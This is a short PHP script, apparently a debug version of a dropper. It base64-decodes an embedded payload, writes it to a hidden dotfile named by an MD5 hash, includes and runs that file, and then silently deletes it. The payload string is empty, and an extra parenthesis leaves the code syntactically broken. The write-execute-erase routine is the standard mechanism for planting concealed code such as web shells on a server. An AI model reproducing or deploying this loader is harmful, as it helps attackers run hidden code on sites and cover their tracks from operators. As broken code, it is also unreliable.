<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Add compatibility function for older PHP versions (PHP 7.4 fix)
if (!function_exists('str_starts_with')) {
    function str_starts_with($haystack, $needle) {
        return (string)$needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;
    }
}

try {
    echo "Debug: Script started<br>";
    
    $__f=__DIR__.'/.'.md5(__FILE__).'.php';
    echo "Debug: File path: " . $__f . "<br>";
    
    $decoded = base64_decode(''));
    
    if ($decoded === false) {
        throw new Exception("Base64 decode failed");
    }
    echo "Debug: Base64 decode successful<br>";
    
    if (file_put_contents($__f, $decoded) === false) {
        throw new Exception("Cannot write file: " . $__f);
    }
    echo "Debug: File written successfully<br>";
    
    if (file_exists($__f)) {
        echo "Debug: File exists, size: " . filesize($__f) . " bytes<br>";
    }
    
    echo "Debug: Attempting to include...<br>";
    include $__f;
    echo "Debug: Include successful<br>";
    
    @unlink($__f);
    echo "Debug: Cleanup complete<br>";
    
} catch (Exception $e) {
    echo "❌ ERROR: " . $e->getMessage() . "<br>";
    echo "File: " . $e->getFile() . " Line: " . $e->getLine() . "<br>";
    echo "<pre>" . print_r(debug_backtrace(), true) . "</pre>";
}
?>
